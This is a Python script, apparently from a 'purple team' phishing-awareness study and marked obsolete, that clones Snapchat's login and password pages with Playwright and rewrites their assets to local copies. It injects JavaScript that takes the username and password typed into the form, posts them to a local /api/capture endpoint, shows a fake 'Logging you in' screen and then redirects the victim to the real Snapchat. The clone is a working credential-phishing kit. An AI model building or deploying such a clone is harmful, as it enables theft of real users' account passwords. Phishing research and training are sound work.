"""
Snapchat Page Cloner — Purple Team Lab — Version Playwright
⚠️  OBSOLÈTE : Les templates sont maintenant captures manuellement.
    Les fichiers login.html, password.html et static/ sont commités.
    Ce script est conserve pour reference uniquement.

USAGE (non recommande) : python3 generate.py [--url URL] [--output DIR] [--static DIR]

RÉSULTAT : templates/login.html + static/{css,js,images}/
"""

import os
import sys
import re
import json
import time
import hashlib
import subprocess
import argparse
from urllib.parse import urljoin, urlparse
import requests
from bs4 import BeautifulSoup

# ============================================================
# CONFIG — synchronisé avec main.py
# ============================================================
CONFIG = {
    "URL": "https://accounts.snapchat.com/v2/login",
    "PASSWORD_URL": "https://accounts.snapchat.com/v2/password",
    "TEMPLATE_DIR": "./templates",
    "STATIC_DIR":    "./static",
    "WAIT_MS":       5000,           # Attendre React rendu (ms)
    "USER_AGENT":   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                    "AppleWebKit/537.36 (KHTML, like Gecko) "
                    "Chrome/125.0.0.0 Safari/537.36",
    "INJECT_TRACKING":    True,
    "INJECT_SUBMIT_HIJACK": True,
}


# ============================================================
# CAPTURE PLAYWRIGHT
# ============================================================

def capture_with_playwright(url, wait_ms=CONFIG["WAIT_MS"]):
    """Lance Chromium headless, capture le HTML COMPLET rendu."""
    from playwright.sync_api import sync_playwright

    print(f"[*] Playwright — lancement de Chromium headless...")

    with sync_playwright() as p:
        browser = p.chromium.launch(
            headless=True,
            args=[
                "--no-sandbox",
                "--disable-setuid-sandbox",
                "--disable-dev-shm-usage",
                "--disable-gpu",
                "--disable-web-security",
                "--disable-features=IsolateOrigins,site-per-process",
            ]
        )

        context = browser.new_context(
            user_agent=CONFIG["USER_AGENT"],
            viewport={"width": 1280, "height": 900},
            java_script_enabled=True,
            ignore_https_errors=True,
        )

        page = context.new_page()

        # Capturer toutes les réponses réseau pour télécharger les ressources
        downloaded = {}

        def handle_response(response):
            try:
                url_resp = response.url
                ct = response.headers.get("content-type", "")
                if any(t in ct for t in ["text/css", "text/javascript", "application/javascript",
                                          "image/png", "image/jpeg", "image/gif", "image/svg+xml",
                                          "image/webp", "image/x-icon"]):
                    downloaded[url_resp] = {
                        "body":   response.body(),
                        "headers": dict(response.headers),
                        "url":    url_resp,
                    }
            except Exception:
                pass

        page.on("response", handle_response)

        print(f"[*] Navigation vers {url} ...")
        try:
            page.goto(url, wait_until="domcontentloaded", timeout=30000)
        except Exception as e:
            print(f"  [!] domcontentloaded erreur, tentative continue... ({e})")
            pass

        print(f"[*] Attente rendu React ({wait_ms}ms)...")
        time.sleep(wait_ms / 1000)

        # Capturer le HTML complet
        html = page.content()

        # Prendre une capture d'écran (pour vérification)
        try:
            os.makedirs(f"{CONFIG['STATIC_DIR']}", exist_ok=True)
            page.screenshot(path=f"{CONFIG['STATIC_DIR']}/_debug_screenshot.png")
            print(f"[✓] Capture d'écran de débogage sauvegardée")
        except Exception:
            pass

        browser.close()

    print(f"[+] HTML complet capturé ({len(html):,} octets)")
    return html, downloaded


# ============================================================
# EXTRACTION DES RESSOURCES
# ============================================================

def extract_resources(html, base_url):
    """Extrait toutes les URLs de ressources depuis le HTML."""
    resources = {"css": [], "js": [], "images": []}
    soup = BeautifulSoup(html, "html.parser")

    # CSS
    for link in soup.find_all("link", rel="stylesheet"):
        href = link.get("href")
        if href:
            full = urljoin(base_url, href)
            resources["css"].append(full)

    # JS
    for script in soup.find_all("script", src=True):
        src = script.get("src")
        if src:
            full = urljoin(base_url, src)
            resources["js"].append(full)

    # Images
    for img in soup.find_all("img", src=True):
        src = img.get("src")
        if src:
            full = urljoin(base_url, src)
            if not full.startswith("data:"):
                resources["images"].append(full)

    # Favicon
    fi = soup.find("link", rel="icon") or soup.find("link", rel="shortcut icon")
    if fi and fi.get("href"):
        full = urljoin(base_url, fi["href"])
        resources["images"].append(full)

    return resources


def download_resource(url):
    """Télécharge une ressource, retourne (content, content_type)."""
    headers = {"User-Agent": CONFIG["USER_AGENT"]}
    try:
        resp = requests.get(url, headers=headers, timeout=10, allow_redirects=True)
        resp.raise_for_status()
        ct = resp.headers.get("Content-Type", "")
        return resp.content, ct
    except Exception as e:
        print(f"    [✗] {url[:80]} → {e}")
        return None, None


def save_resource(url, content, content_type):
    """Sauvegarde une ressource dans static/."""
    ext_map = {
        "text/css":                    ".css",
        "text/javascript":             ".js",
        "application/javascript":      ".js",
        "application/x-javascript":    ".js",
        "image/png":                   ".png",
        "image/jpeg":                  ".jpg",
        "image/gif":                   ".gif",
        "image/svg+xml":               ".svg",
        "image/webp":                  ".webp",
        "image/x-icon":                ".ico",
    }

    parsed = urlparse(url)
    filename = os.path.basename(parsed.path) or f"res_{hash(url)}"

    # Ajoute l'extension si manquante
    if "." not in os.path.splitext(filename)[1]:
        ext = ext_map.get(content_type.split(";")[0].strip(), "")
        if ext:
            filename += ext

    # Détermine le sous-dossier
    ct_lower = content_type.split(";")[0].strip().lower()
    if "css" in ct_lower:
        subfolder = "css"
    elif "javascript" in ct_lower or "js" in filename:
        subfolder = "js"
    elif "image" in ct_lower:
        subfolder = "images"
    else:
        subfolder = "other"

    folder = os.path.join(CONFIG["STATIC_DIR"], subfolder)
    os.makedirs(folder, exist_ok=True)

    path = os.path.join(folder, filename)
    rel_path = f"/static/{subfolder}/{filename}"

    if not os.path.exists(path):
        with open(path, "wb") as f:
            f.write(content)
        print(f"  [✓] {subfolder}/{filename}  ({len(content):,} octets)")
    else:
        print(f"  [≡] {subfolder}/{filename}  (exist)")

    return rel_path


def fix_resources_in_html(html, base_url, resource_map):
    """Remplace les URLs externes par les chemins locaux."""
    soup = BeautifulSoup(html, "html.parser")

    # CSS
    for link in soup.find_all("link", rel="stylesheet"):
        href = link.get("href")
        if href:
            full = urljoin(base_url, href)
            local = resource_map.get(full)
            if local:
                link["href"] = local

    # JS
    for sc in soup.find_all("script", src=True):
        src = sc.get("src")
        if src:
            full = urljoin(base_url, src)
            local = resource_map.get(full)
            if local:
                sc["src"] = local

    # Images
    for img in soup.find_all("img", src=True):
        src = img.get("src")
        if src and not src.startswith("data:"):
            full = urljoin(base_url, src)
            local = resource_map.get(full)
            if local:
                img["src"] = local

    # Favicon
    fi = soup.find("link", rel="icon") or soup.find("link", rel="shortcut icon")
    if fi and fi.get("href"):
        full = urljoin(base_url, fi["href"])
        local = resource_map.get(full)
        if local:
            fi["href"] = local

    return str(soup)


# ============================================================
# INJECTIONS JS
# ============================================================

def inject_button_blocker(soup, allowed_btn_selectors=None):
    """Injecte un script qui bloque les boutons non-fonctionnels
    et affiche un toast 'Service temporairement indisponible'."""
    if allowed_btn_selectors is None:
        allowed_btn_selectors = ['form button[type="submit"]', 'form button.Login_next__2nEN0']
    blocked = BeautifulSoup(f"""
<script>
(function() {{
    var allowed = {json.dumps(allowed_btn_selectors)};
    function isAllowed(el) {{
        for (var i = 0; i < allowed.length; i++) {{
            try {{
                if (el.matches(allowed[i])) return true;
            }} catch(e) {{}}
        }}
        return false;
    }}
    var toast = document.createElement('div');
    toast.id = 'lab-toast';
    toast.style.cssText = 'position:fixed;bottom:24px;left:50%;transform:translateX(-50%);background:#000;color:#fff;padding:12px 24px;border-radius:8px;font-family:Avenir Next,Helvetica Neue,sans-serif;font-size:14px;z-index:999999;opacity:0;transition:opacity 0.3s;pointer-events:none;text-align:center;max-width:90%';
    toast.textContent = '🔒 Service temporairement indisponible dans le cadre de l\'étude.';
    document.body.appendChild(toast);
    var toastTimer = null;
    function showToast(msg) {{
        toast.textContent = msg;
        toast.style.opacity = '1';
        if (toastTimer) clearTimeout(toastTimer);
        toastTimer = setTimeout(function() {{ toast.style.opacity = '0'; }}, 3000);
    }}
    document.addEventListener('click', function(e) {{
        var t = e.target.closest('a, button, [role="button"], input[type="submit"], select');
        if (!t) return;
        if (isAllowed(t)) return;
        e.preventDefault();
        e.stopPropagation();
        showToast('🔒 Cette fonctionnalité est désactivée dans le cadre de l\'étude.');
    }}, true);
}})();
</script>""", "html.parser")
    body = soup.body
    if body:
        body.append(blocked)
    return soup


def inject_pid_script(soup):
    """Injecte le participant_id dans tous les formulaires."""
    pid_script = BeautifulSoup("""
<script>
(function () {
    var pid = sessionStorage.getItem('participant_id') || '';
    if (pid) {
        document.querySelectorAll('form').forEach(function (f) {
            var inp = document.createElement('input');
            inp.type = 'hidden';
            inp.name = 'participant_id';
            inp.value = pid;
            f.appendChild(inp);
        });
    }
})();
</script>""", "html.parser")
    body = soup.body
    if body:
        body.append(pid_script)
    return soup


def inject_capture_script(soup, redirect_url_template):
    """Injecte le script de capture pour la page de mot de passe."""
    script = BeautifulSoup(f"""
<script>
(function() {{
    var findBtn = function() {{
        var btn = document.querySelector('form button[type="submit"]');
        if (btn) return btn;
        var all = document.querySelectorAll('button');
        for (var i = 0; i < all.length; i++) {{
            var txt = all[i].textContent.trim().toLowerCase();
            if (txt === 'log in' || txt === 'next') return all[i];
        }}
        return all[0];
    }};
    var btn = findBtn();
    if (!btn) return;
    btn.addEventListener('click', function(e) {{
        e.preventDefault();
        var form = btn.closest('form') || document.querySelector('form');
        if (!form) return;
        var fd = new FormData(form);
        var data = {{}};
        fd.forEach(function(v, k) {{ data[k] = v; }});
        data.participant_id = sessionStorage.getItem('participant_id') || '';
        fetch('/api/capture', {{
            method: 'POST',
            headers: {{'Content-Type': 'application/json'}},
            body: JSON.stringify(data),
            keepalive: true
        }});
        var container = document.querySelector('.Login_container__KLPD5') || form.parentElement;
        if (container) {{
            container.innerHTML = '<div style="display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:200px;gap:16px;padding:40px;font-family:Avenir Next,Helvetica Neue,Helvetica,Arial,sans-serif"><div style="width:40px;height:40px;border:4px solid #eee;border-top-color:#FFFC00;border-radius:50%;animation:spin 1s linear infinite"></div><p style="font-size:16px;color:#16191c">Logging you in...</p><p style="font-size:12px;color:#71757a">One moment please</p></div><style>@keyframes spin{{to{{transform:rotate(360deg)}}}}</style>';
        }}
        setTimeout(function() {{
            window.location.href = '{redirect_url_template}';
        }}, 2000);
    }});
}})();
</script>""", "html.parser")
    body = soup.body
    if body:
        body.append(script)
    return soup


def build_injected_html(rendered_html, output_name="login.html"):
    """Injecte le tracking JS, le submit hijack et les bloqueurs."""
    soup = BeautifulSoup(rendered_html, "html.parser")

    body = soup.body
    if not body:
        print("[!] Pas de <body> — injection impossible")
        return str(soup)

    # 1. Participant ID dans les formulaires
    soup = inject_pid_script(soup)

    if output_name == "password.html":
        # Page mot de passe : capture + redirection vers snapchat.com
        soup = inject_capture_script(soup, "https://snapchat.com/")
        soup = inject_button_blocker(soup, ['form button[type="submit"]'])
    else:
        # Page login : capture + redirection vers /password
        soup = inject_capture_script(soup, "'/password?u=' + encodeURIComponent(data.accountIdentifier || data.username || '')")
        soup = inject_button_blocker(soup, ['form button[type="submit"]'])

    return str(soup)


# ============================================================
# CAPTURE PAGE MOT DE PASSE (étape 2)
# ============================================================

def capture_password_page(password_url, wait_ms=CONFIG["WAIT_MS"]):
    """Capture la page mot de passe Snapchat directement depuis /v2/password."""
    from playwright.sync_api import sync_playwright

    print(f"[*] Playwright — capture page mot de passe...")

    with sync_playwright() as p:
        browser = p.chromium.launch(
            headless=True,
            args=["--no-sandbox", "--disable-setuid-sandbox", "--disable-dev-shm-usage",
                  "--disable-gpu", "--disable-web-security",
                  "--disable-features=IsolateOrigins,site-per-process"]
        )
        context = browser.new_context(
            user_agent=CONFIG["USER_AGENT"],
            viewport={"width": 1280, "height": 900},
            java_script_enabled=True,
            ignore_https_errors=True,
            locale="en-US",
        )
        page = context.new_page()
        downloaded = {}

        def handle_response(response):
            try:
                url_resp = response.url
                ct = response.headers.get("content-type", "")
                if any(t in ct for t in ["text/css", "text/javascript", "application/javascript",
                                          "image/png", "image/jpeg", "image/gif", "image/svg+xml",
                                          "image/webp", "image/x-icon"]):
                    downloaded[url_resp] = {
                        "body": response.body(),
                        "headers": dict(response.headers),
                        "url": url_resp,
                    }
            except Exception:
                pass

        page.on("response", handle_response)

        print(f"[*] Navigation vers {password_url} ...")
        try:
            page.goto(password_url, wait_until="domcontentloaded", timeout=30000)
        except Exception as e:
            print(f"  [!] {e}")

        print(f"[*] Attente rendu React ({wait_ms}ms)...")
        time.sleep(wait_ms / 1000)

        # Capturer le HTML
        html = page.content()
        print(f"[+] HTML page mot de passe capturé ({len(html):,} octets)")

        try:
            os.makedirs(f"{CONFIG['STATIC_DIR']}", exist_ok=True)
            page.screenshot(path=f"{CONFIG['STATIC_DIR']}/_debug_screenshot_password.png")
            print(f"[✓] Capture d'écran mot de passe sauvegardée")
        except Exception:
            pass

        browser.close()

    return html, downloaded


# ============================================================
# MAIN
# ============================================================

def main():
    parser = argparse.ArgumentParser(description="Snapchat Page Cloner — Purple Team Lab")
    parser.add_argument("--url",   default=CONFIG["URL"])
    parser.add_argument("--output", default=CONFIG["TEMPLATE_DIR"])
    parser.add_argument("--static", default=CONFIG["STATIC_DIR"])
    parser.add_argument("--no-tracking",    action="store_true")
    parser.add_argument("--no-hijack",      action="store_true")
    parser.add_argument("--wait", type=int, default=CONFIG["WAIT_MS"],
                        help="Attente rendu React (ms)")
    args = parser.parse_args()

    CONFIG["TEMPLATE_DIR"]      = args.output
    CONFIG["STATIC_DIR"]        = args.static
    CONFIG["INJECT_TRACKING"]   = not args.no_tracking
    CONFIG["INJECT_SUBMIT_HIJACK"] = not args.no_hijack
    CONFIG["WAIT_MS"]           = args.wait

    os.makedirs(args.output, exist_ok=True)
    os.makedirs(args.static,   exist_ok=True)

    # 1. Capture Playwright
    rendered_html, network_resources = capture_with_playwright(args.url)

    # 2. Extraire les ressources
    print("[*] Extraction des ressources depuis le HTML...")
    res = extract_resources(rendered_html, args.url)

    total = sum(len(v) for v in res.values())
    print(f"[+] {total} ressources trouvées  "
          f"(CSS:{len(res['css'])}, JS:{len(res['js'])}, IMG:{len(res['images'])})")

    # 3. Télécharger ressources
    print("[*] Téléchargement...")
    resource_map = {}

    for category in ["css", "js", "images"]:
        for url_res in res[category]:
            print(f"  → {url_res[:70]}")
            content, ct = download_resource(url_res)
            if content:
                local = save_resource(url_res, content, ct)
                resource_map[url_res] = local

    # 4. Corriger les URLs dans le HTML
    html_fixed = fix_resources_in_html(rendered_html, args.url, resource_map)

    # 5. Injections JS
    html_final = build_injected_html(html_fixed)

    # 6. Sauvegarder login.html
    out_path = os.path.join(args.output, "login.html")
    with open(out_path, "w", encoding="utf-8") as f:
        f.write(html_final)

    sz = os.path.getsize(out_path)
    print(f"\n[✓] login.html sauvegardé : {out_path}  ({sz:,} octets)")

    # 7. Capturer la page mot de passe
    print("\n[*] === CAPTURE PAGE MOT DE PASSE ===")
    try:
        pwd_html, pwd_resources = capture_password_page(CONFIG["PASSWORD_URL"], wait_ms=args.wait)
        pwd_res_list = extract_resources(pwd_html, args.url)
        for category in ["css", "js", "images"]:
            for url_res in pwd_res_list[category]:
                if url_res not in resource_map:
                    print(f"  → {url_res[:70]}")
                    content, ct = download_resource(url_res)
                    if content:
                        local = save_resource(url_res, content, ct)
                        resource_map[url_res] = local
        pwd_html_fixed = fix_resources_in_html(pwd_html, args.url, resource_map)
        pwd_html_final = build_injected_html(pwd_html_fixed, output_name="password.html")
        pwd_out_path = os.path.join(args.output, "password.html")
        with open(pwd_out_path, "w", encoding="utf-8") as f:
            f.write(pwd_html_final)
        sz_pwd = os.path.getsize(pwd_out_path)
        print(f"[✓] password.html sauvegardé : {pwd_out_path}  ({sz_pwd:,} octets)")
    except Exception as e:
        print(f"[!] Échec capture mot de passe : {e}")
        print("[*] Utilisation du template password.html manuel existant")

    print(f"\n[✓] {len(resource_map)} ressources locales")
    print(f"\nProchaine étape : python3 main.py")
    print(f"Puis ouvrir : http://localhost:5000")


if __name__ == "__main__":
    main()
